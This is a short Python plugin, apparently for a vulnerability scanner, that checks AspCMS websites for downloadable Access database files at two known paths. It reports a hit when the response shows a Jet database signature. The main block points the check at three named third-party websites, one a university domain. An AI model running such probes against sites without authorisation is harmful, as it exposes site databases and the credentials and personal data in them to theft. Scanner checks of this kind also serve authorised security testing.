#! /usr/bin/env python
# -*- coding: utf-8 -*-
#author:    oneroy@qq.com
#refer:     http://www.wooyun.org/bugs/wooyun-2010-060483

import re

def assign(service, arg):
    if service == "aspcms":
        return True, arg

def audit(arg):
    payloads=["data/%23aspcms252.asp","data/%23data.asp"]
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode,_ = curl.curl2(url)
        if (code==200 or code==500) and  "Standard Jet DB" in res:
            security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('aspcms','http://cwpi.cn/')[1])
    audit(assign('aspcms', 'http://qiqo.hznu.edu.cn/')[1])
    audit(assign('aspcms','http://www.qicaiky.com/')[1])